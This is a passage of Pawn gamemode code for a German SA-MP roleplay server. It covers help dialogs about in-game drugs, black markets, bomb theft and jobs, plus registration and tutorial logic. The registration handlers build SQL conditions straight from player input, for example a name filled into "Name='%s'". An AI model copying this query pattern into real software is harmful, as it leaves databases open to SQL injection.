	            new dialogstr[450] = "{FF0000}Schwarzmarkt{FFFFFF}\n\n Im Schwarzmarkt können Illegal Waffen gekauft werden. Du findest den Schwarzmarkt in der nähe von Wrong Hill!\nEbenso kannst du hier deine Illegalen Fische in Koks oder Geld eintauschen.\n\n\n";
	            strcat(dialogstr,"{FF0000}Gangwar & Mats{FFFFFF}\n\n Es gibt viele Ganggebiete die Eingenommen werden können. Pro eingenommene Zone bei einem GangPayDay bekommt die Fraktions +250$ & 50 Mats in die Fraktionskasse gezahlt. \n\nBefehle: /gangzonen /angreifen");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Schwarzmärkte und Gangwar/Mats",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 6)
			{
	            new dialogstr[1000] = "{FF0000}Kontakt mit dem Team{FFFFFF}\n\n Wann sollte man den Support benutzen?\n 1. Ein Fehler im Spiel ist aufgetreten.\n 2. Ein Spieler verhält sich Aggressiv gegenüber anderen Spielern.\n 3. Ein Cheater wurde gesichtigt.\n 4. Ich habe eine Frage die andere Spieler mir nicht beantworten können.\n\n Sollte eins der Themen übereinstimmen darf ein Support Ticket erstellt werden!\n\n\n\n";
	            strcat(dialogstr," Um ein Support Ticket erstellen, nutze den Befehl {FF0000}/support {FFFFFF}.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Team",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 7)
			{
	            new dialogstr[1000] = "{FF0000}Hilfe zum platzieren von Möbeln!{FFFFFF}\n\n Möbel können mit dem Befehl (/katalog) gekauft werden. Um Möbel in seinem Haus oder Garten platzieren zu können sollte sich der Spieler auf dem Grundstück davon befinden.\n Der Möbelinventar kann mit (/moebel) aufgerufen werden., um ein Möbelstück spawnen zu können klicke in der Liste auf ein gekauftes Möbelstück.\n";
	            strcat(dialogstr," Nun ist es im Haus gespawnt, es kann per Editor verschoben werden. Sollte es die richtige Position haben, muss man auf die Speicherkarte des Editors klicken. Das editieren von Möbeln sehen andere Spieler nicht, erst ab dem speichern.\n\n {FF0000}Verunstaltung vom eigenem Haus werden mit einem Hausverkauf bestraft! Aktueller Möbellimit: 15");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Möbel",dialogstr, "Schließen", "");
				return 1;
			}
            if(listitem == 8)
			{
			    new dialogstr[1000] = "{FF0000}Drogen verwenden und anpflanzen!{FFFFFF}\n\n Drogen sind Illegal, lass dich dabei nicht von der Polizei erwischen!\n Gras Samen kannst Du beim HotDog Verkäufer Jonny erwerben, er befindet sich im Lake Sorten Stadtpark.\n Solltest Du nun ein paar davon haben, öffne deinen Inventar, und pflanze deine Samen irgendwo abseits der Stadt am besten an.\n";
	            strcat(dialogstr," Nach einer Zeit kann die Drogenpflanze geerntet werden, sobald es kein Polizist vernichtet.\n\n\n {FF0000}Das ANPFLANZEN in einem Objekten ist verboten, sowohl auch im Wasser!\n\nKoks bekommt man durch Schildkröten die du Angeln musst, diese kannst du\n am Schwarzmarkt eintauschen gegen Koks. Koks bringt dir Armour");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Drogen",dialogstr, "Schließen", "");
				return 1;
			}
   			if(listitem == 9)
			{
			    new dialogstr[600] = "{FF0000}Angel Erklärung{FFFFFF}\n\n Es gibt Legale und Illegale Fische. Legale Fisch kannst du beim Fischmarkt in Santa Felton verkaufen und bekommst Geld dafür!\n";
	            strcat(dialogstr," Illegale Fische können von der Polizei abgenommen werden.\n/inventar für Angel rausnehmen /angel zum Angel wegpacken und /angeln damit du angeln kannst.\nMit /wegwerfen kannst du Fische zurück ins Wasser werfen.\n\nIllegale Fische: Schildkröte, Delfin und Haie");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Angeln",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 10)
			{
			    new dialogstr[800] = "{FF0000}Bombenklau Erklärung{FFFFFF}\n\n Nahe Army Gelände an der Straße befindet sich ein Tor, dies kannst du Knacken! Zum Knacken verwende die Taste 'H'.\n";
	            strcat(dialogstr," Beachte das du an der Code-Eingabe stehen musst. Du schwimmst also durch den Tunnel und begibst dich in die Base. Dort befinden sich rote Türen.\n Diese roten Türen musst du aufschießen, dann müsste links eine Bombe liegen und diese klickst du mit dem Objecte Zeiger Taste 'Z' an.\n Du kannst den Gleichen weg zurück verwenden. Das Tor am Ende ist auch von innen aufmachbar.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Bombenklau",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 11)
			{
			    new dialogstr[800] = "{FF0000}Atombombe{FFFFFF}\n\n Die Atombombe kann nur alle 48 Stunden gezündet werden, der Zünder kann auf dem Flugzeugräger gefunden werden.\n";
	            strcat(dialogstr," Der Flugzeugträger ist mit Stahltüren geschützt, es werden insgesamt zwei Bomben benötigt. Eine für die Tür, die andere für den Tresor.\n Der Zünder kann mit der 'H' Taste aus dem Tresor nach der Sprengung genommen werden und ist dann im Inventar zu finden.\n ");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Atombombe",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 12)
			{
			    new dialogstr[800] = "{FF0000}Geldtransporter{FFFFFF}\n\n Der Geldtransporter spawnt jede 5 Stunden und kann von der Polizei zur Sante Felton Bank eskotiert werden.\n";
	            strcat(dialogstr,"Sei schneller als die Polizei im Geldtransporter, oder starte einen Raub bei der Eskortierung und fahre Ihn nach Wrong Hill um ihn dort sprengen zu lassen.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Geldtransporter",dialogstr, "Schließen", "");
				return 1;
			}
		}
	}
	if(dialogid == DIALOG_JOB_HILFE)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
				new dialogstr[1000] = "{FF0000}Farmer{FFFFFF}\n\n Steige als erster in einen Mähdrescher und ernte das Feld, fahre über das Getreide, dabei wird es verschwinden und Getreidesamen werden am Boden hinterlassen.\n Sollte das Feld geerntet sein, fahre und stelle den Mähdrescher wieder zurück. Nun steige in einen Traktor und kupple den Ackeranhänger mit Taste [STRG] an. Nun fahre über die Getreidesamen.\n";
	            strcat(dialogstr," Nach einer Zeit wächst wieder neues Getreide und kann neu geerntet werden.\n\n\n Tipp: Suche dir einen Kollegen, einer erntet das Feld mit dem Mähdrescher und der andere pflanzt mit dem Traktor neues Getreide an.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Farmer",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 1)
	        {
				new dialogstr[1000] = "{FF0000}Müllmann{FFFFFF}\n\n Steige in einen Müllwagen, nun suche in der Stadt nach Mülltonnen, hast Du welche gefunden steige aus und stelle Dich vor eine hin.\n Nun drücke die Taste [Z], jetzt klicke auf [Objekte-Zeiger], mit der Maus klickst du nun auf das Objekt, sprich die Mülltonne.\n Nun hast Du die Möglichkeit auf [leeren] zu klicken, trage den Müllsack hinter das Müllauto.\n";
	            strcat(dialogstr," Nun wirfst Du den Müllsack in das Fahrzeug, dies wird automatisch geschehen. Nun weiter zu nächsten Mülltonne, Du hast noch viel vor dir!\n\n\n Müllmann-Tipp: Ein Spieler fährt der andere sammelt, nach einer Zeit wechselt euch ab.");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Müllmann",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 2)
	        {
				new dialogstr[1000] = "{FF0000}Taxifahrer{FFFFFF}\n\n Als Taxifahrer bekommst Du Anrufe von Spielern, benutze {FF0000}/fahrpreis{FFFFFF} um den Preis pro Kilometer einzustellen.\n\n\n";
	            strcat(dialogstr,"Tipp: Stelle die Fahrpreise nicht zu hoch um keine Fahrgäste zu verärgern!");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Taxifahrer",dialogstr, "Schließen", "");
				return 1;
            }
			if(listitem == 3)
	        {
				new dialogstr[1000] = "{FF0000}Busfahrer{FFFFFF}\n\n Benutze den Befehl {FF0000}/linien{FFFFFF} um einer der Linien abzufahren. Fahre nun die Checkpoints ab.\n\n Tipp: Fahre die Strecke zu ende um ein Zuschlag am Schluss zu bekommen.";
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Busfahrer",dialogstr, "Schließen", "");
				return 1;
            }
			if(listitem == 4)
	        {
				new dialogstr[1000] = "{FF0000}Trucker{FFFFFF}\n\n ";
	            strcat(dialogstr,"{FF0000}Trucker{FFFFFF}\n\n Benutze den Befehl {FF0000}/trucker{FFFFFF} um den Job zu starten\n.Benutze {FF0000}/trucktor{FFFFFF} um die Tore der Trucks für Produktlieferungen zu öffnen.\nMit der 'H' Taste kann die Haustür geöffnet werden.  ");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Trucker",dialogstr, "Schließen", "");
				return 1;
			}
			if(listitem == 5)
	        {
				new dialogstr[1000] = "{FF0000}Holzfäller{FFFFFF}\n\n ";
	            strcat(dialogstr,"{FF0000}Holzfäller{FFFFFF}\n\n Benutze den Befehl {FF0000}/holzen{FFFFFF} für eine Motorsäge.\nDas Holz kannst du anschließend im Industrie abgeben. Die Abgabestelle \nfindest du unter /navi -> Jobs -> Holzfällerabgabe");
				ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Holzfäller",dialogstr, "Schließen", "");
				return 1;
			}
		}
	}
	if(dialogid == DIALOG_SCHWARZMARKT)
	{
	    if(response)
	    {
	        SMarktChoose[playerid][1] = listitem;
	        ShowPlayerDialog(playerid,DIALOG_SCHWARZMARKT2,DIALOG_STYLE_INPUT,"Schwarzmarkt","Wie viel Gramm Drogen willst du kaufen?","Kaufen","Abbrechen");
	    }

	}
	if(dialogid == DIALOG_SCHWARZMARKT2)
	{

	    if(response)
	    {
	        if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens ein Gramm kaufen!");
	        if(SMarktChoose[playerid][1] == 0)
	        {
				if(strval(inputtext) > GangDrogen[SMarktChoose[playerid][0]][MengeGras]) return SendClientMessage(playerid,COLOR_RED,"So viel Gras ist nicht im Lager des Schwarzmarktes!");
				if(SpielerInfo[playerid][uGeld] < GangDrogen[SMarktChoose[playerid][0]][Gras]*strval(inputtext)) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld bei dir!");
				GebeGeld(playerid,-GangDrogen[SMarktChoose[playerid][0]][Gras]*strval(inputtext));
				GangDrogen[SMarktChoose[playerid][0]][MengeGras]-=strval(inputtext);
			}
	        else if(SMarktChoose[playerid][1] == 1)
	        {
				/*if(strval(inputtext) > GangDrogen[SMarktChoose[playerid][0]][MengeKoks]) return SendClientMessage(playerid,COLOR_RED,"So viel Koks ist nicht im Lager des Schwarzmarktes!");
				if(SpielerInfo[playerid][uGeld] < GangDrogen[SMarktChoose[playerid][0]][Koks]*strval(inputtext)) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld bei dir!");
				GebeGeld(playerid,-GangDrogen[SMarktChoose[playerid][0]][Koks]*strval(inputtext));
				GangDrogen[SMarktChoose[playerid][0]][MengeKoks]-=strval(inputtext);*/
				return SendClientMessage(playerid,COLOR_YELLOW,"Koks gibt es zur Zeit noch nicht, es wird in kürze Verfügbar sein.");
			}
			else if(SMarktChoose[playerid][1] == 2)
	        {
				/*if(strval(inputtext) > GangDrogen[SMarktChoose[playerid][0]][MengeLSD]) return SendClientMessage(playerid,COLOR_RED,"So viel LSD ist nicht im Lager des Schwarzmarktes!");
				if(SpielerInfo[playerid][uGeld] < GangDrogen[SMarktChoose[playerid][0]][LSD]*strval(inputtext)) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld bei dir!");
				GebeGeld(playerid,-GangDrogen[SMarktChoose[playerid][0]][LSD]*strval(inputtext));
				GangDrogen[SMarktChoose[playerid][0]][MengeLSD]-=strval(inputtext);*/
				return SendClientMessage(playerid,COLOR_YELLOW,"LSD gibt es zur Zeit noch nicht, es wird in kürze Verfügbar sein.");
			}
	        SendClientMessage(playerid,COLOR_GREEN,"Drogen gekauft!");
	    }
	}
	if(dialogid == DIALOG_GANGBIZZ_GANG)
	{
	    if(response)
	    {
	        SMarktChoose[playerid][0] = listitem;
			if(listitem == 0) ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS,DIALOG_STYLE_LIST,"Was willst du einlagern?","Gras\nKoks\nLSD","Weiter","Abbrechen");
			else if(listitem == 1)
			{
			    new frak;
				if(SpielerInfo[playerid][uLeiter] > 0) frak = SpielerInfo[playerid][uLeiter]-8;
				else frak = SpielerInfo[playerid][uMitglied]-8;
			    format(string,sizeof string,"Gras\nKoks\nLSD",GangDrogen[frak][Gras],GangDrogen[frak][Koks],GangDrogen[frak][LSD]);
				ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS,DIALOG_STYLE_LIST,"Für was willst du den Preis einstellen?",string,"Weiter","Abbrechen");
			}
	    }

	}
	if(dialogid == DIALOG_GANGBIZZ_SETTINGS)
	{
	    if(response)
	    {
	        SMarktChoose[playerid][1] = listitem;
	        if(SMarktChoose[playerid][0] == 0)
			{
				if(listitem == 0) ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS2,DIALOG_STYLE_INPUT,"Einlagern","Wie viel Gras willst du einlagern?","Einlagern","Abbrechen");
				if(listitem == 1) ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS2,DIALOG_STYLE_INPUT,"Einlagern","Wie viel Koks willst du einlagern?","Einlagern","Abbrechen");
				if(listitem == 2) ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS2,DIALOG_STYLE_INPUT,"Einlagern","Wie viel LSD willst du einlagern?","Einlagern","Abbrechen");
			}
	        else
	        {
	            if(listitem == 0) ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS2,DIALOG_STYLE_INPUT,"Preis","Welchen Preis willst du für Gras einstellen?\nPreis pro Gramm","Einstellen","Abbrechen");
	            if(listitem == 1) ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS2,DIALOG_STYLE_INPUT,"Preis","Welchen Preis willst du für Koks einstellen?\nPreis pro Gramm","Einstellen","Abbrechen");
	            if(listitem == 2) ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_SETTINGS2,DIALOG_STYLE_INPUT,"Preis","Welchen Preis willst du für LSD einstellen?\nPreis pro Gramm","Einstellen","Abbrechen");
	        }
		}

	}
	if(dialogid == DIALOG_GANGBIZZ_SETTINGS2)
	{
	    if(response)
	    {
	        new frak;
			if(SpielerInfo[playerid][uLeiter] > 0) frak = SpielerInfo[playerid][uLeiter];
			else frak = SpielerInfo[playerid][uMitglied];
	        if(SMarktChoose[playerid][0] == 0)
	        {
	            if(strval(inputtext) < 1) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens 1 Gramm einlagern!");
	            if(SMarktChoose[playerid][1] == 0)
	            {
	                if(SpielerInfo[playerid][uGras] < strval(inputtext)) {  return SendClientMessage(playerid,COLOR_RED,"So viel Gras hast du nicht bei dir!"); }
	                SpielerInfo[playerid][uGras]-=strval(inputtext);
	                GangDrogen[frak-8][MengeGras]+=strval(inputtext);
	                SendClientMessage(playerid,COLOR_GREEN,"Gras einlagern!");
	            }
	            if(SMarktChoose[playerid][1] == 1)
	            {
	                if(SpielerInfo[playerid][uKoks] < strval(inputtext)) {  return SendClientMessage(playerid,COLOR_RED,"So viel Koks hast du nicht bei dir!"); }
	                SpielerInfo[playerid][uKoks]-=strval(inputtext);
	                GangDrogen[frak-8][MengeKoks]+=strval(inputtext);
	                SendClientMessage(playerid,COLOR_GREEN,"Koks einlagern!");
	            }
	            if(SMarktChoose[playerid][1] == 2)
	            {
	                if(SpielerInfo[playerid][uLSD] < strval(inputtext)) {  return SendClientMessage(playerid,COLOR_RED,"So viel LSD hast du nicht bei dir!"); }
	                SpielerInfo[playerid][uLSD]-=strval(inputtext);
	                GangDrogen[frak-8][MengeLSD]+=strval(inputtext);
	                SendClientMessage(playerid,COLOR_GREEN,"LSD einlagern!");
	            }
	        }
	        else
	        {
	        	if(strval(inputtext) < 1) {  return SendClientMessage(playerid,COLOR_RED,"Du Preis muss mindestens 1$ betragen!"); }
	            if(SMarktChoose[playerid][1] == 0)
	            {
	                GangDrogen[frak-8][Gras]+=floatstr(inputtext);
	                SendClientMessage(playerid,COLOR_GREEN,"Graspreis eingestellt!");
	            }
	            if(SMarktChoose[playerid][1] == 1)
	            {
	                GangDrogen[frak-8][Koks]+=floatstr(inputtext);
	                SendClientMessage(playerid,COLOR_GREEN,"Kokspreis eingestellt!");
	            }
	            if(SMarktChoose[playerid][1] == 2)
	            {
	                GangDrogen[frak-8][LSD]+=floatstr(inputtext);
	                SendClientMessage(playerid,COLOR_GREEN,"LSDpreis eingestellt!");
	            }
	        }
		}

	}
	if(dialogid == DIALOG_GANGBIZZ_KAUF)
	{
	    if(response)
	    {
	        SMarktChoose[playerid][1] = listitem;
	        if(FrakWaffen[SMarktChoose[playerid][0]][listitem][0] < 16)
	        {
	            if(FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][1] > SpielerInfo[playerid][uGeld]) {  return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!"); }
				GebeWaffe(playerid,FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][0],1);
				GebeGeld(playerid,-FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][1]);
				Fraktionskasse[SMarktChoose[playerid][0]+8]+=float((FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][1])/5);
				SendClientMessage(playerid,COLOR_GREEN,"Waffe gekauft!");

	        }
	        else ShowPlayerDialog(playerid,DIALOG_GANGBIZZ_KAUF2,DIALOG_STYLE_INPUT,"Ganggeschäft","Wie viel Munition willst du kaufen?\n1$ pro Kugel","Kaufen","Abbrechen");
	    }

	}
	/*if(dialogid == DIALOG_GANGBIZZ_KAUF2)
	{

	    if(response)
	    {
			new muni = strval(inputtext);
			if(muni < 0 || muni > 999)  {  return SendClientMessage(playerid,COLOR_RED,"Du musst einen Betrag zwischen 1 und 999 angeben!"); }
			if(FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][1]+muni > SpielerInfo[playerid][uGeld]) {  return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!"); }
			GebeWaffe(playerid,FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][0],muni);
			GebeGeld(playerid,-FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][1]-muni);
			Fraktionskasse[SMarktChoose[playerid][0]+8]+=float((FrakWaffen[SMarktChoose[playerid][0]][SMarktChoose[playerid][1]][1]+muni)/5);
			SendClientMessage(playerid,COLOR_GREEN,"Waffe gekauft!");
	    }
	}*/
	if(dialogid == DIALOG_GRASSAMEN)
	{

	    if(response)
	    {
	        if(strval(inputtext) < 0 || strval(inputtext) > 1000) return SendClientMessage(playerid,COLOR_RED,"Du musst einen Betrag zwischen 1 und 1000 angeben!");
	        if(strval(inputtext)*3 > SpielerInfo[playerid][uGeld]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
	        if(!Verstauen(playerid,16304,strval(inputtext))) return SendClientMessage(playerid,COLOR_RED,"Inventar voll!");
	        GebeGeld(playerid,-strval(inputtext)*3);
	        format(string,sizeof string,"%d Weedsamen für %d$ gekauft!",strval(inputtext),strval(inputtext)*3);
	        SetPlayerChatBubble(GetPlayerID("BauerJones"),"Ich wünsche noch einen wunderschönen Tag auf dieser wunderschönen Farm",COLOR_GREEN,10,4000);
	        SendClientMessage(playerid,COLOR_GREEN,string);
	    }
	}
 	if(dialogid == DIALOG_GESCHLECHT)
	{
	    new skin = random(5);
	    new geben;
	    if(response)
	    {
			if(skin == 0){geben = 158;}
			else if(skin == 1){geben = 159;}
			else if(skin == 2){geben = 134;}
			else if(skin == 3){geben = 135;}
			else if(skin == 4){geben = 162;}
	        SetPlayerSkin(playerid,geben);
	        SpielerInfo[playerid][uZiviSkin] = geben;
	        SpielerInfo[playerid][uZiviFrak] = 0;
	        SpielerInfo[playerid][uSkin] = geben;
	    }
	    else
	    {
			if(skin == 0){geben = 77;}
			else if(skin == 1){geben = 198;}
			else if(skin == 2){geben = 193;}
			else if(skin == 3){geben = 226;}
			else if(skin == 4){geben = 55;}
	        SetPlayerSkin(playerid,geben);
	        SpielerInfo[playerid][uZiviSkin] = geben;
	        SpielerInfo[playerid][uZiviFrak] = 0;
	        SpielerInfo[playerid][uSkin] = geben;
	    }
  		new string2[2];
  		SpielerInfo[playerid][uGeschlecht] = response;
	    format(string2,sizeof string2,"%d",response);
	    format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
	    mysqlupdate("user",string,"Geschlecht",string2);
		ShowPlayerDialog(playerid,DIALOG_GEBURTSTAG,DIALOG_STYLE_INPUT,"Persönliche Informationen","Gebe hier dein Geburtsdatum ein:\n\nFormat: 01.01.1990","Weiter","");
	}
	if(dialogid == DIALOG_GEBURTSTAG)
	{
	    new tag,monat,jahr;
	    if(sscanf(inputtext,"p<.>ddd",tag,monat,jahr)) return ShowPlayerDialog(playerid,DIALOG_GEBURTSTAG,DIALOG_STYLE_INPUT,"Persönliche Informationen","Gebe hier dein Geburtsdatum ein:\n\n{FF0000}Format: 01.01.1990","Weiter","");
		if(jahr < 1920 || jahr > 2016 || monat < 0 || monat > 12 || tag < 0 || tag > 31) return ShowPlayerDialog(playerid,DIALOG_GEBURTSTAG,DIALOG_STYLE_INPUT,"Persönliche Informationen","Gebe hier dein Geburtsdatum ein:\n{FF0000}Format: 01.01.1901","Weiter","");

		format(string,sizeof string,"UPDATE `user` SET Jahr='%d',Monat='%d',Tag='%d' WHERE userID='%d'",jahr,monat,tag,SpielerInfo[playerid][uID]);
		mysql_query(dbhandle, string);
		SpielerInfo[playerid][uJahr] = jahr;
		SpielerInfo[playerid][uMonat] = monat;
		SpielerInfo[playerid][uTag] = tag;
		printf("%s",string);
		ShowPlayerDialog(playerid,DIALOG_EMAIL,DIALOG_STYLE_INPUT,"Persönliche Informationen","Wie bist du auf uns aufmerksam geworden?\n\nz.B. Facebook, Instagram, Freunde?","Weiter","");
	}
	if(dialogid == DIALOG_EMAIL)
	{
	    new string2[40];
	    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,DIALOG_EMAIL,DIALOG_STYLE_INPUT,"Persönliche Informationen","Wie bist du auf uns aufmerksam geworden?\n\nz.B. Facebook, Instagram","Weiter","");
		format(string2,sizeof string2,"%s",inputtext);
	    format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
	    mysqlupdate("user",string,"email",string2);
	    ShowPlayerDialog(playerid,DIALOG_WERBEN,DIALOG_STYLE_INPUT,"Persönliche Informationen","Von welchem Spieler wurdest du geworben? (Genauer Name)\n\nFalls du von niemanden geworben wurdest, schreibe 'Keiner' in das Feld.","Weiter","");
	}
	if(dialogid == DIALOG_WERBEN)
	{
	    new ktext[10] = "Keiner";
	    new data[20];
	    new nstring[50];
	    if(!strlen(inputtext)) return ShowPlayerDialog(playerid,DIALOG_WERBEN,DIALOG_STYLE_INPUT,"Persönliche Informationen","Von welchem Spieler wurdest du geworben? (Genauer Name)\n\nFalls du von niemanden geworben wurdest schreibe 'Keiner' in das Feld.","Weiter","");
        format(string,sizeof(string),"Name='%s'",inputtext);
        format(nstring,sizeof(nstring),"%s",PlayerName(playerid));
        if(strcmp(inputtext, nstring, true) == 0)
        {
            ShowPlayerDialog(playerid,DIALOG_WERBEN,DIALOG_STYLE_INPUT,"Persönliche Informationen","Du kannst dich nicht selbst werben!\nVon welchem Spieler wurdest du geworben? (Genauer Name)\n\nFalls du von niemanden geworben wurdest schreibe 'Keiner' in das Feld.","Weiter","");
        }
        else
        {
	        if(strcmp(inputtext, ktext, true) == 0)
	        {
	            SendClientMessage(playerid,COLOR_GREEN,"Dich hat also 'KEINER' geworben! Registrierung abgeschlossen!");
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"[TUTORIAL]: Nun folgt eine Einführung in unsere Features, somit lernst Du gleich die Insel etwas kennen.");
		   		SpielerInfo[playerid][uEingeloggt] = 1;
		   		imtut[playerid] = 1;
				TogglePlayerSpectating(playerid,true);
				tutorialcp[playerid] ++;
				TUTTIMER[playerid] = SetTimerEx("tutorial", 200, 0, "i", playerid);
				SpielerInfo[playerid][uWerbunguser] = 0;
	        }
	        else
	        {
	            if(mysqlget("login",string,"ID",data))
				{
				    new ttstring[265];
					format(ttstring,sizeof(ttstring),"Du wurdest also von %s geworben! Registrierung abgeschlossen!",inputtext);
					SendClientMessage(playerid,COLOR_GREEN,ttstring);
					format(string,sizeof string,"INSERT INTO `geworben`(`userID`, `geworbenvon`) VALUES (%i,%i)",SpielerInfo[playerid][uID],strval(data));
					mysql_query(dbhandle, string);
				    SendClientMessage(playerid,COLOR_LIGHTBLUE,"[TUTORIAL]: Nun folgt eine Einführung in unsere Features, somit lernst Du gleich die Insel etwas kennen.");
			   		SpielerInfo[playerid][uEingeloggt] = 1;
			   		imtut[playerid] = 1;
					TogglePlayerSpectating(playerid,true);
					tutorialcp[playerid] ++;
					TUTTIMER[playerid] = SetTimerEx("tutorial", 200, 0, "i", playerid);
					SpielerInfo[playerid][uWerbunguser] = 1;
				}
				else
				{
				    ShowPlayerDialog(playerid,DIALOG_WERBEN,DIALOG_STYLE_INPUT,"Persönliche Informationen","Spieler wurde nicht gefunden!\nVon welchem Spieler wurdest du geworben? (Genauer Name)\n\nFalls du von niemanden geworben wurdest schreibe 'Keiner' in das Feld.","Weiter","");
				}
	        }
		}
	}
	return 1;
}
forward tutorial(playerid);
public tutorial(playerid)
{
    SetPlayerVirtualWorld(playerid,playerid+1);
    printf("%d",GetPlayerVirtualWorld(playerid));
	if(tutorialcp[playerid] == 1)
	{
	    TUTTIMER[playerid] = SetTimerEx("tutorial", 21500, 1, "i", playerid);
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 1/10] - Unsere Insel");
	    SendClientMessage(playerid,COLOR_WEISS,"Wir befinden uns hier nicht in San Andreas, sondern auf einer selbst erstellten Insel.");
	    SendClientMessage(playerid,COLOR_WEISS,"County Islands besteht aus 4 Inseln. Lake Sorten (Hauptstadt), Santa Felton, Lake Vortex und Portland.");
	    SendClientMessage(playerid,COLOR_WEISS,"Jede Stadt besitzt Immobilien die auch gekauft werden können, die Häuser stehen anfangs leer.");
	    SendClientMessage(playerid,COLOR_WEISS,"Durch den Möbelkatalog können die Häuser möbeliert werden. Fahrzeuge können in der Garage geparkt werden.");
	    SendClientMessage(playerid,COLOR_WEISS,"");
	    SetPlayerCameraPos(playerid,1788.4801,-9598.9697,6.1270);
	    SetPlayerCameraLookAt(playerid,1781.2560,-9538.2793,4.4101);
	    tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 2)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 2/10] - Police Department");
	    SendClientMessage(playerid,COLOR_WEISS,"Es gibt insgesamt zwei Police Departments auf County Islands. Einmal in Lake Sorten und in Santa Felton.");
	    SendClientMessage(playerid,COLOR_WEISS,"Das Police Department sorgt für Recht und Ordnung auf der Insel. Spieler die mit Wanteds erwischt werden,");
	    SendClientMessage(playerid,COLOR_WEISS,"müssen eine gewisse Zeit in der Zelle verbringen. Mit Hilfe eines Mitspielers kann aus dieser ausgebrochen werden.");
	    SendClientMessage(playerid,COLOR_WEISS,"{AF0000}WICHTIG:{FEFEFE} Um Waffen Legal mitführen zu dürfen, muss der Waffenschein im PD erworben werden.");
	    SendClientMessage(playerid,COLOR_WEISS,"");
	    SetPlayerCameraPos(playerid,1591.6399,-9450.5518,13.7822);
	    SetPlayerCameraLookAt(playerid,1566.2128,-9476.1563,10.6044);
	    tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 3)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 3/10] - Burger Shot");
	    SendClientMessage(playerid,COLOR_WEISS,"Du findest oben rechts eine {FFCD52}gelbe {FEFEFE}Hungeranzeige. Sollte diese  am Ende sein, so besuche z.B. den Burger Shot.");
	    SendClientMessage(playerid,COLOR_WEISS,"Eine große Auswahl an Nahrungsmitteln wird dir dort angeboten. Der Burger Shot ist auch Teil des Geschäftssystemes,");
	    SendClientMessage(playerid,COLOR_WEISS,"und kann somit auch erworben werden. Einnahmen kommen in die Geschäftskasse und können vom Besitzer ausgezahlt werden.");
	    SendClientMessage(playerid,COLOR_WEISS,"");
	    SetPlayerCameraPos(playerid,1789.5121,-9174.7939,8.8650);
	    SetPlayerCameraLookAt(playerid,1765.1853,-9189.2764,6.2502);
	    tutorialcp[playerid] ++;
	}
	else if(tutorialcp[playerid] == 4)
	{
	    SendClientMessage(playerid,COLOR_TUT,"|- [TUTORIAL 4/10] - Krankenhaus und Fire & Rescue Service");
	    SendClientMessage(playerid,COLOR_WEISS,"Solltest Du an deinen Verletzungen erliegen, so spawnst Du im Normalfall hier.");
